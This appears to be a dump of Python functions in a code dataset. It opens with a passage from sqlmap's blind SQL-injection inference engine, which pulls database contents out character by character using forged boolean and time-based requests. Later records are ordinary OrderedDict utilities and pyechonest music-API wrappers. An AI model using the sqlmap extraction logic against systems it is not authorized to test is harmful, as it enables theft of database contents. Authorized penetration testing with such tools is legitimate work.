Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n            incrementCounter(kb.technique)\n\n            if result:\n                minValue = posValue\n\n                if type(charTbl) != xrange:\n                    charTbl = charTbl[position:]\n                else:\n                    # xrange() - extended virtual charset used for memory/space optimization\n                    charTbl = xrange(charTbl[position], charTbl[-1] + 1)\n            else:\n                maxValue = posValue\n\n                if type(charTbl) != xrange:\n                    charTbl = charTbl[:position]\n                else:\n                    charTbl = xrange(charTbl[0], charTbl[position])\n\n            if len(charTbl) == 1:\n                if continuousOrder:\n                    if maxValue == 1:\n                        return None\n\n                    # Going beyond the original charset\n                    elif minValue == maxChar:\n                        # If the original charTbl was [0,..,127] new one\n                        # will be [128,..,(128 << 4) - 1] or from 128 to 2047\n                        # and instead of making a HUGE list with all the\n                        # elements we use a xrange, which is a virtual\n                        # list\n                        if expand and shiftTable:\n                            charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())\n                            originalTbl = xrange(charTbl)\n                            maxChar = maxValue = charTbl[-1]\n                            minChar = minValue = charTbl[0]\n                        else:\n                            return None\n                    else:\n                        retVal = minValue + 1\n\n                        if retVal in originalTbl or (retVal == ord('\\n') and CHAR_INFERENCE_MARK in payload):\n                            if timeBasedCompare and not validateChar(idx, retVal):\n                                if not kb.originalTimeDelay:\n                                    kb.originalTimeDelay = conf.timeSec\n\n                                kb.timeValidCharsRun = 0\n                                if (conf.timeSec - kb.originalTimeDelay) < MAX_TIME_REVALIDATION_STEPS:\n                                    errMsg = \"invalid character detected. retrying..\"\n                                    logger.error(errMsg)\n\n                                    conf.timeSec += 1\n\n                                    warnMsg = \"increasing time delay to %d second%s \" % (conf.timeSec, 's' if conf.timeSec > 1 else '')\n                                    logger.warn(warnMsg)\n\n                                    if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:\n                                        dbgMsg = \"turning off time auto-adjustment mechanism\"\n                                        logger.debug(dbgMsg)\n                                        kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO\n\n                                    return getChar(idx, originalTbl, continuousOrder, expand, shiftTable)\n                                else:\n                                    errMsg = \"unable to properly validate last character value ('%s')..\" % decodeIntToUnicode(retVal)\n                                    logger.error(errMsg)\n                                    conf.timeSec = kb.originalTimeDelay\n                                    return decodeIntToUnicode(retVal)\n                            else:\n                                if timeBasedCompare:\n                                    kb.timeValidCharsRun += 1\n                                    if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and kb.timeValidCharsRun > VALID_TIME_CHARS_RUN_THRESHOLD:\n                                        dbgMsg = \"turning back on time auto-adjustment mechanism\"\n                                        logger.debug(dbgMsg)\n                                        kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES\n\n                                return decodeIntToUnicode(retVal)\n                        else:\n                            return None\n                else:\n                    if minValue == maxChar or maxValue == minChar:\n                        return None\n\n                    for index in xrange(len(originalTbl)):\n                        if originalTbl[index] == minValue:\n                            break\n\n                    # If we are working with non-continuous elements, both minValue and character after\n                    # are possible candidates\n                    for retVal in (originalTbl[index], originalTbl[index + 1]):\n                        forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, retVal))\n                        result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n                        incrementCounter(kb.technique)\n\n                        if result:\n                            return decodeIntToUnicode(retVal)\n\n                    return None\n\n    # Go multi-threading (--threads > 1)\n    if conf.threads > 1 and isinstance(length, int) and length > 1:\n        threadData = getCurrentThreadData()\n\n        threadData.shared.value = [None] * length\n        threadData.shared.index = [firstChar]    # As list for python nested function scoping\n        threadData.shared.start = firstChar\n\n        try:\n            def blindThread():\n                threadData = getCurrentThreadData()\n\n                while kb.threadContinue:\n                    kb.locks.index.acquire()\n\n                    if threadData.shared.index[0] - firstChar >= length:\n                        kb.locks.index.release()\n\n                        return\n\n                    threadData.shared.index[0] += 1\n                    curidx = threadData.shared.index[0]\n                    kb.locks.index.release()\n\n                    if kb.threadContinue:\n                        charStart = time.time()\n                        val = getChar(curidx)\n                        if val is None:\n                            val = INFERENCE_UNKNOWN_CHAR\n                    else:\n                        break\n\n                    with kb.locks.value:\n                        threadData.shared.value[curidx - 1 - firstChar] = val\n                        currentValue = list(threadData.shared.value)\n\n                    if kb.threadContinue:\n                        if showEta:\n                            progress.progress(time.time() - charStart, threadData.shared.index[0])\n                        elif conf.verbose >= 1:\n                            startCharIndex = 0\n                            endCharIndex = 0\n\n                            for i in xrange(length):\n                                if currentValue[i] is not None:\n                                    endCharIndex = max(endCharIndex, i)\n\n                            output = ''\n\n                            if endCharIndex > conf.progressWidth:\n                                startCharIndex = endCharIndex - conf.progressWidth\n\n                            count = threadData.shared.start\n\n                            for i in xrange(startCharIndex, endCharIndex + 1):\n                                output += '_' if currentValue[i] is None else currentValue[i]\n\n                            for i in xrange(length):\n                                count += 1 if currentValue[i] is not None else 0\n\n                            if startCharIndex > 0:\n                                output = '..' + output[2:]\n\n                            if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):\n                                output = output[:-2] + '..'\n\n                            if conf.verbose in (1, 2) and not showEta and not hasattr(conf, \"api\"):\n                                _ = count - firstChar\n                                output += '_' * (min(length, conf.progressWidth) - len(output))\n                                status = ' %d/%d (%d%%)' % (_, length, round(100.0 * _ / length))\n                                output += status if _ != length else \" \" * len(status)\n\n                                dataToStdout(\"\\r[%s] [INFO] retrieved: %s\" % (time.strftime(\"%X\"), filterControlChars(output)))\n\n            runThreads(numThreads, blindThread, startThreadMsg=False)\n\n        except KeyboardInterrupt:\n            abortedFlag = True\n\n        finally:\n            value = [_ for _ in partialValue]\n            value.extend(_ for _ in threadData.shared.value)\n\n        infoMsg = None\n\n        # If we have got one single character not correctly fetched it\n        # can mean that the connection to the target URL was lost\n        if None in value:\n            partialValue = \"\".join(value[:value.index(None)])\n\n            if partialValue:\n                infoMsg = \"\\r[%s] [INFO] partially retrieved: %s\" % (time.strftime(\"%X\"), filterControlChars(partialValue))\n        else:\n            finalValue = \"\".join(value)\n            infoMsg = \"\\r[%s] [INFO] retrieved: %s\" % (time.strftime(\"%X\"), filterControlChars(finalValue))\n\n        if conf.verbose in (1, 2) and not showEta and infoMsg and not hasattr(conf, \"api\"):\n            dataToStdout(infoMsg)\n\n    # No multi-threading (--threads = 1)\n    else:\n        index = firstChar\n\n        while True:\n            index += 1\n            charStart = time.time()\n\n            # Common prediction feature (a.k.a. \"good samaritan\")\n            # NOTE: to be used only when multi-threading is not set for\n            # the moment\n            if conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:\n                val = None\n                commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)\n\n                # If there is one single output in common-outputs, check\n                # it via equal against the query output\n                if commonValue is not None:\n                    # One-shot query containing equals commonValue\n                    testValue = unescaper.escape(\"'%s'\" % commonValue) if \"'\" not in commonValue else unescaper.escape(\"%s\" % commonValue, quote=False)\n\n                    query = kb.injection.data[kb.technique].vector\n                    query = agent.prefixQuery(query.replace(\"[INFERENCE]\", \"(%s)=%s\" % (expressionUnescaped, testValue)))\n                    query = agent.suffixQuery(query)\n\n                    result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)\n                    incrementCounter(kb.technique)\n\n                    # Did we have luck?\n                    if result:\n                        if showEta:\n                            progress.progress(time.time() - charStart, len(commonValue))\n                        elif conf.verbose in (1, 2) or hasattr(conf, \"api\"):\n                            dataToStdout(filterControlChars(commonValue[index - 1:]))\n\n                        finalValue = commonValue\n                        break\n\n                # If there is a common pattern starting with partialValue,\n                # check it via equal against the substring-query output\n                if commonPattern is not None:\n                    # Substring-query containing equals commonPattern\n                    subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))\n                    testValue = unescaper.escape(\"'%s'\" % commonPattern) if \"'\" not in commonPattern else unescaper.escape(\"%s\" % commonPattern, quote=False)\n\n                    query = kb.injection.data[kb.technique].vector\n                    query = agent.prefixQuery(query.replace(\"[INFERENCE]\", \"(%s)=%s\" % (subquery, testValue)))\n                    query = agent.suffixQuery(query)\n\n                    result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)\n                    incrementCounter(kb.technique)\n\n                    # Did we have luck?\n                    if result:\n                        val = commonPattern[index - 1:]\n                        index += len(val) - 1\n\n                # Otherwise if there is no commonValue (single match from\n                # txt/common-outputs.txt) and no commonPattern\n                # (common pattern) use the returned common charset only\n                # to retrieve the query output\n                if not val and commonCharset:\n                    val = getChar(index, commonCharset, False)\n\n                # If we had no luck with commonValue and common charset,\n                # use the returned other charset\n                if not val:\n                    val = getChar(index, otherCharset, otherCharset == asciiTbl)\n            else:\n                val = getChar(index, asciiTbl)\n\n            if val is None:\n                finalValue = partialValue\n                break\n\n            if kb.data.processChar:\n                val = kb.data.processChar(val)\n\n            partialValue += val\n\n            if showEta:\n                progress.progress(time.time() - charStart, index)\n            elif conf.verbose in (1, 2) or hasattr(conf, \"api\"):\n                dataToStdout(filterControlChars(val))\n\n            # some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces\n            if len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace() and partialValue.strip(' ')[-1:] != '\\n':\n                finalValue = partialValue[:-INFERENCE_BLANK_BREAK]\n                break\n\n            if (lastChar > 0 and index >= lastChar):\n                finalValue = \"\" if length == 0 else partialValue\n                finalValue = finalValue.rstrip() if len(finalValue) > 1 else finalValue\n                partialValue = None\n                break\n\nexcept KeyboardInterrupt:\n    abortedFlag = True\nfinally:\n    kb.prependFlag = False\n    kb.stickyLevel = None\n    retrievedLength = len(finalValue or \"\")\n\n    if finalValue is not None:\n        finalValue = decodeHexValue(finalValue) if conf.hexConvert else finalValue\n        hashDBWrite(expression, finalValue)\n    elif partialValue:\n        hashDBWrite(expression, \"%s%s\" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))\n\nif conf.hexConvert and not abortedFlag and not hasattr(conf, \"api\"):\n    infoMsg = \"\\r[%s] [INFO] retrieved: %s  %s\\n\" % (time.strftime(\"%X\"), filterControlChars(finalValue), \" \" * retrievedLength)\n    dataToStdout(infoMsg)\nelse:\n    if conf.verbose in (1, 2) and not showEta and not hasattr(conf, \"api\"):\n        dataToStdout(\"\\n\")\n\n    if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:\n        infoMsg = \"retrieved: %s\" % filterControlChars(finalValue)\n        logger.info(infoMsg)\n\nif kb.threadException:\n    raise SqlmapThreadException(\"something unexpected happened inside the threads\")\n\nif abortedFlag:\n    raise KeyboardInterrupt\n\n_ = finalValue or partialValue\nreturn getCounter(kb.technique), safecharencode(_) if kb.safeCharEncode else _", "path": "src\\pentest\\sqlmap\\lib\\techniques\\blind\\inference.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nRename the key for a given value, without modifying sequence order.\n\nFor the case where new_key already exists this raise an exception,\nsince if new_key exists, it is ambiguous as to what happens to the\nassociated values, and the position of new_key in the sequence.\n\n>>> od = OrderedDict()\n>>> od['a'] = 1\n>>> od['b'] = 2\n>>> od.items()\n[('a', 1), ('b', 2)]\n>>> od.rename('b', 'c')\n>>> od.items()\n[('a', 1), ('c', 2)]\n>>> od.rename('c', 'a')\nTraceback (most recent call last):\nValueError: New key already exists: 'a'\n>>> od.rename('d', 'b')\nTraceback (most recent call last):\nKeyError: 'd'\n\"\"\"\n", "func_signal": "def rename(self, old_key, new_key):\n", "code": "if new_key == old_key:\n    # no-op\n    return\nif new_key in self:\n    raise ValueError(\"New key already exists: %r\" % new_key)\n# rename sequence entry\nvalue = self[old_key] \nold_idx = self._sequence.index(old_key)\nself._sequence[old_idx] = new_key\n# rename internal dict entry\ndict.__delitem__(self, old_key)\ndict.__setitem__(self, new_key, value)", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nUsed for __repr__ and __str__\n\n>>> r1 = repr(OrderedDict((('a', 'b'), ('c', 'd'), ('e', 'f'))))\n>>> r1\n\"OrderedDict([('a', 'b'), ('c', 'd'), ('e', 'f')])\"\n>>> r2 = repr(OrderedDict((('a', 'b'), ('e', 'f'), ('c', 'd'))))\n>>> r2\n\"OrderedDict([('a', 'b'), ('e', 'f'), ('c', 'd')])\"\n>>> r1 == str(OrderedDict((('a', 'b'), ('c', 'd'), ('e', 'f'))))\nTrue\n>>> r2 == str(OrderedDict((('a', 'b'), ('e', 'f'), ('c', 'd'))))\nTrue\n\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "return '%s([%s])' % (self.__class__.__name__, ', '.join(\n    ['(%r, %r)' % (key, self[key]) for key in self._sequence]))", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\n>>> d = OrderedDict(((1, 3), (3, 2), (2, 1)))\n>>> c = OrderedDict(((0, 3), (3, 2), (2, 1)))\n>>> c < d\nTrue\n>>> d < c\nFalse\n>>> d < dict(c)\nTraceback (most recent call last):\nTypeError: Can only compare with other OrderedDicts\n\"\"\"\n", "func_signal": "def __lt__(self, other):\n", "code": "if not isinstance(other, OrderedDict):\n    raise TypeError('Can only compare with other OrderedDicts')\n# FIXME: efficiency?\n#   Generate both item lists for each compare\nreturn (self.items() < other.items())", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"Add an item to the end.\"\"\"\n# FIXME: this is only append if the key isn't already present\n", "func_signal": "def append(self, item):\n", "code": "key, value = item\nself._main[key] = value", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"Reverse the values\"\"\"\n", "func_signal": "def reverse(self):\n", "code": "vals = self._main.values()\nvals.reverse()\n# FIXME: efficiency\nself[:] = vals", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "# FIXME: is only a true extend if none of the keys already present\n", "func_signal": "def extend(self, other):\n", "code": "for item in other:\n    key, value = item\n    self._main[key] = value", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nYou can pass in a list of values, which will replace the\ncurrent list. The value list must be the same len as the OrderedDict.\n\n(Or a ``ValueError`` is raised.)\n\n>>> d = OrderedDict(((1, 3), (3, 2), (2, 1)))\n>>> d.setvalues((1, 2, 3))\n>>> d\nOrderedDict([(1, 1), (3, 2), (2, 3)])\n>>> d.setvalues([6])\nTraceback (most recent call last):\nValueError: Value list is not the same length as the OrderedDict.\n\"\"\"\n", "func_signal": "def setvalues(self, values):\n", "code": "if len(values) != len(self):\n    # FIXME: correct error to raise?\n    raise ValueError('Value list is not the same length as the '\n        'OrderedDict.')\nself.update(zip(self, values))", "path": "src\\pentest\\sqlmap\\thirdparty\\odict\\odict.py", "repo_name": "pwnieexpress/raspberry_pwn", "stars": 994, "license": "gpl-3.0", "language": "python", "size": 17478}
{"docstring": "\"\"\"\nUpdate a catalog object\n\nArgs:\n    items (list): A list of dicts describing update data and action codes (see api docs)\n\nKwargs:\n\nReturns:\n    A ticket id\n\nExample:\n\n>>> c = catalog.Catalog('my_songs', type='song')\n>>> items\n[{'action': 'update',\n  'item': {'artist_name': 'dAn ThE aUtOmAtOr',\n           'disc_number': 1,\n           'genre': 'Instrumental',\n           'item_id': '38937DDF04BC7FC4',\n           'play_count': 5,\n           'release': 'Bombay the Hard Way: Guns, Cars & Sitars',\n           'song_name': 'Inspector Jay From Dehli',\n           'track_number': 9,\n           'url': 'file://localhost/Users/tylerw/Music/iTunes/iTunes%20Media/Music/Dan%20the%20Automator/Bombay%20the%20Hard%20Way_%20Guns,%20Cars%20&%20Sitars/09%20Inspector%20Jay%20From%20Dehli.m4a'}}]\n>>> ticket = c.update(items)\n>>> ticket\nu'7dcad583f2a38e6689d48a792b2e4c96'\n>>> c.status(ticket)\n{u'ticket_status': u'complete', u'update_info': []}\n>>>\n\n\"\"\"\n", "func_signal": "def update(self, items):\n", "code": "post_data = {}\nitems_json = json.dumps(items, default=dthandler)\npost_data['data'] = items_json\n\nresponse = self.post_attribute(\"update\", data=post_data)\n\nreturn response['ticket']", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nReturns list of all catalogs created on this API key\n\nArgs:\n\nKwargs:\n    results (int): An integer number of results to return\n\n    start (int): An integer starting value for the result set\n\nReturns:\n    A list of catalog objects\n\nExample:\n\n>>> catalog.list_catalogs()\n[<catalog - test_artist_catalog>, <catalog - test_song_catalog>, <catalog - my_songs>]\n>>>\n\n\"\"\"\n", "func_signal": "def list_catalogs(results=30, start=0):\n", "code": "result = util.callm(\"%s/%s\" % ('catalog', 'list'), {'results': results, 'start': start})\ncats = [Catalog(**util.fix(d)) for d in result['response']['catalogs']]\nstart = result['response']['start']\ntotal = result['response']['total']\nreturn ResultList(cats, start, total)", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nCreates a catalog object, with a given name. Does not check to see if the catalog already exists.\n\nCreate a catalog object like\n\"\"\"\n", "func_signal": "def create_catalog_by_name(name, T=\"general\"):\n", "code": "result = util.callm(\"catalog/create\", {}, POST=True, \n                        data={\"name\":name, \"type\":T})\nresult = result['response']\nreturn Catalog(result['id'], **dict( (k,result[k]) for k in ('name', 'type')))", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "# delete attributes with an unset value\n", "func_signal": "def elem(self, name, value, attrs={ }):\n", "code": "for (k, v) in attrs.items():\n    if v is None or v == '':\n        del attrs[k]\n\nif value is None or value == '':\n    if len(attrs) == 0:\n        return\n    self._out.write(self._getIndention())\n    self._out.write(self._makeTag(name, attrs, True) + '\\n')\nelse:\n    escValue = saxutils.escape(value or '')\n    self._out.write(self._getIndention())\n    self._out.write(self._makeTag(name, attrs))\n    self._out.write(escValue)\n    self._out.write('</%s>\\n' % name)", "path": "examples\\try_new_things.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nThis is the function that actually creates the track object\n\"\"\"\n", "func_signal": "def _track_from_response(result, timeout):\n", "code": "response = result['response']\nstatus = response['track']['status'].lower()\n\nif status == 'pending':\n    # Need to wait for async upload or analyze call to finish.\n    result = _wait_for_pending_track(response['track']['id'], timeout)\n    response = result['response']\n    status = response['track']['status'].lower()\n\nif not status == 'complete':\n    track_id = response['track']['id']\n    if status == 'pending':\n        raise Exception('%s: the operation didn\\'t complete before the timeout (%d secs)' %\n                        (track_id, timeout))\n    else:\n        raise Exception('%s: there was an error analyzing the track, status: %s' % (track_id, status))\nelse:\n    # track_properties starts as the response dictionary.\n    track_properties = response['track']\n    # 'id' and 'md5' are separated to construct the Track object.\n    identifier = track_properties.pop('id')\n    md5        = track_properties.pop('md5', None) # tracks from song api calls will not have an md5\n    # Pop off the audio_summary dict and make those keys attributes\n    # of the Track. This includes things like tempo, energy, and loudness.\n    track_properties.update(track_properties.pop('audio_summary'))\n    return Track(identifier, md5, track_properties)", "path": "pyechonest\\track.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\" Retrieve the detailed analysis for the track, if available. \n    Raises Exception if unable to create the detailed analysis. \"\"\"\n", "func_signal": "def get_analysis(self):\n", "code": "if self.analysis_url:\n    try:\n        # Try the existing analysis_url first. This expires shortly\n        # after creation.\n        try:\n            json_string = urllib2.urlopen(self.analysis_url).read()\n        except urllib2.HTTPError:\n            # Probably the analysis_url link has expired. Refresh it.\n            param_dict = dict(id = self.id)\n            new_track = _profile(param_dict, DEFAULT_ASYNC_TIMEOUT)\n            if new_track and new_track.analysis_url:\n                self.analysis_url = new_track.analysis_url\n                json_string = urllib2.urlopen(self.analysis_url).read()\n            else:\n                raise Exception(\"Failed to create track analysis.\")\n\n        analysis = json.loads(json_string)\n        analysis_track = analysis.pop('track', {})\n        self.__dict__.update(analysis)\n        self.__dict__.update(analysis_track)\n    except Exception: #pylint: disable=W0702\n        # No detailed analysis found.\n        raise Exception(\"Failed to create track analysis.\")\nelse:\n    raise Exception(\"Failed to create track analysis.\")", "path": "pyechonest\\track.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nGrabs a catalog by name, if its there on the api key.\nOtherwise, an error is thrown (mirroring the API)\n\"\"\"\n", "func_signal": "def get_catalog_by_name(name):\n", "code": "kwargs = {\n        'name' : name,\n    }\nresult = util.callm(\"%s/%s\" % ('catalog', 'profile'), kwargs)\nreturn Catalog(**util.fix(result['response']['catalog']))", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nReturns feed (news, blogs, reviews, audio, video) for the catalog artists; response depends on requested buckets\n\nArgs:\n\nKwargs:\n    buckets (list): A list of strings specifying which feed items to retrieve\n\n    results (int): An integer number of results to return\n\n    start (int): An integer starting value for the result set\n\nReturns:\n    A list of news, blogs, reviews, audio or video document dicts;\n\nExample:\n\n>>> c\n<catalog - my_artists>\n>>> c.get_feed(results=15)\n\t{u'date_found': u'2011-02-06T07:50:25',\n\t u'date_posted': u'2011-02-06T07:50:23',\n \t u'id': u'caec686c0dff361e4c53dceb58fb9d2f',\n \t u'name': u'Linkin Park \\u2013 \\u201cWaiting For The End\\u201d + \\u201cWhen They Come For Me\\u201d 2/5 SNL',\n \t u'references': [{u'artist_id': u'ARQUMH41187B9AF699',\n\t          u'artist_name': u'Linkin Park'}],\n\t u'summary': u'<span>Linkin</span> <span>Park</span> performed \"Waiting For The End\" and \"When They Come For Me\" on Saturday Night Live. Watch the videos below and pick up their album A Thousand Suns on iTunes, Amazon MP3, CD    Social Bookmarking ... ',\n\t u'type': u'blogs',\n\t u'url': u'http://theaudioperv.com/2011/02/06/linkin-park-waiting-for-the-end-when-they-come-for-me-25-snl/'}\n>>>\n\"\"\"\n", "func_signal": "def get_feed(self, buckets=None, since=None, results=15, start=0):\n", "code": "kwargs = {}\nkwargs['bucket'] = buckets or []", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nCreate a track object from a filename.\n\nNOTE: Does not create the detailed analysis for the Track. Call\nTrack.get_analysis() for that.\n\nArgs:\n    filename: A string containing the path to the input file.\n    filetype: A string indicating the filetype; Defaults to None (type determined by file extension).\n    force_upload: skip the MD5 shortcut path, force an upload+analysis\n\nExample:\n    >>> t = track.track_from_filename(\"Miaow-01-Tempered-song.mp3\")\n    >>> t\n    < Track >\n    >>>\n\"\"\"\n", "func_signal": "def track_from_filename(filename, filetype = None, timeout=DEFAULT_ASYNC_TIMEOUT, force_upload=False):\n", "code": "filetype = filetype or filename.split('.')[-1]\nfile_object = open(filename, 'rb')\nresult = track_from_file(file_object, filetype, timeout, force_upload)\nfile_object.close()\nreturn result", "path": "pyechonest\\track.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nCreate a track object from a public http URL.\n\nNOTE: Does not create the detailed analysis for the Track. Call\nTrack.get_analysis() for that.\n\nArgs:\n    url: A string giving the URL to read from. This must be on a public machine accessible by HTTP.\n\nExample:\n    >>> t = track.track_from_url(\"http://www.miaowmusic.com/mp3/Miaow-01-Tempered-song.mp3\")\n    >>> t\n    < Track >\n    >>>\n\n\"\"\"\n", "func_signal": "def track_from_url(url, timeout=DEFAULT_ASYNC_TIMEOUT):\n", "code": "param_dict = dict(url = url)\nreturn _upload(param_dict, timeout, data=None)", "path": "pyechonest\\track.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nCalls upload either with a local audio file,\nor a url. Returns a track object.\n\"\"\"\n", "func_signal": "def _upload(param_dict, timeout, data):\n", "code": "param_dict['format'] = 'json'\nparam_dict['wait'] = 'true'\nparam_dict['bucket'] = 'audio_summary'\nresult = util.callm('track/upload', param_dict, POST = True, socket_timeout = 300,  data = data)\nreturn _track_from_response(result, timeout)", "path": "pyechonest\\track.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"send me a list of (artist,title,mp3_url)\"\"\"\n", "func_signal": "def write_xspf(f, tuples):\n", "code": "xml = XmlWriter(f, indentAmount='  ')\nxml.prolog()\nxml.start('playlist', { 'xmlns': 'http://xspf.org/ns/0/', 'version': '1' })\nxml.start('trackList')\nfor tupe in tuples:\n    xml.start('track')\n    xml.elem('creator',tupe[0])\n    xml.elem('title',tupe[1])\n    xml.elem('location', tupe[2])\n    xml.end()\nxml.end()\nxml.end()\nf.close()", "path": "examples\\try_new_things.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nReturns data from the catalog; also expanded for the requested buckets\n\nArgs:\n\nKwargs:\n    buckets (list): A list of strings specifying which buckets to retrieve\n\n    results (int): An integer number of results to return\n\n    start (int): An integer starting value for the result set\n\nReturns:\n    A list of dicts representing objects in the catalog; list has additional attributes 'start' and 'total'\n\nExample:\n\n>>> c\n<catalog - my_songs>\n>>> c.read_items(results=1)\n[\n        {\n            \"artist_id\": \"AR78KRI1187B98E6F2\",\n            \"artist_name\": \"Art of Noise\",\n            \"date_added\": \"2012-04-02T16:50:02\",\n            \"foreign_id\": \"CAHLYLR13674D1CF83:song:1000\",\n            \"request\": {\n                \"artist_name\": \"The Art Of Noise\",\n                \"item_id\": \"1000\",\n                \"song_name\": \"Love\"\n            },\n            \"song_id\": \"SOSBCTO1311AFE7AE0\",\n            \"song_name\": \"Love\"\n        }\n]\n\"\"\"\n", "func_signal": "def get_item_dicts(self, buckets=None, results=15, start=0,item_ids=None):\n", "code": "kwargs = {}\nkwargs['bucket'] = buckets or []\nkwargs['item_id'] = item_ids or []\nresponse = self.get_attribute(\"read\", results=results, start=start, **kwargs)\nrval = ResultList(response['catalog']['items'])\nif item_ids:\n    rval.start=0;\n    rval.total=len(response['catalog']['items'])\nelse:\n    rval.start = response['catalog']['start']\n    rval.total = response['catalog']['total']\nreturn rval", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nReturns a list of all assets available in this sandbox\n\nArgs:\n    sandbox_name (str): A string representing the name of the sandbox\n\nKwargs:\n    results (int): An integer number of results to return\n    \n    start (int): An integer starting value for the result set\n    \nReturns:\n    A list of asset dictionaries\n\nExample:\n\n>>> sandbox.list('bluenote')\n[{}, {}]\n>>> \n\n\n\"\"\"\n", "func_signal": "def list(sandbox_name, results=15, start=0):\n", "code": "result = util.callm(\"%s/%s\" % ('sandbox', 'list'), {'sandbox':sandbox_name, 'results': results, 'start': start})\nassets = result['response']['assets']\nstart = result['response']['start']\ntotal = result['response']['total']\n\nreturn ResultList(assets, start, total)", "path": "pyechonest\\sandbox.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nReturns a list of assets with expiring access urls that can be used to download them\n*Requires Oauth*\n\nArgs:\n    sandbox_name (str): A string representing the name of the sandbox\n    asset_ids (list): A list of asset_ids (str) to fetch\n\nKwargs:\n    \nReturns:\n    A list of asset dictionaries\n\nExample:\n\n>>> sandbox.access('bluenote', ['12345'])\n[{}, {}]\n>>> \n\n\n\"\"\"\n", "func_signal": "def access(sandbox_name, asset_ids):\n", "code": "result = util.oauthgetm(\"%s/%s\" % ('sandbox', 'access'), {'sandbox':sandbox_name, 'id':asset_ids})\nreturn  result['response']['assets']", "path": "pyechonest\\sandbox.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
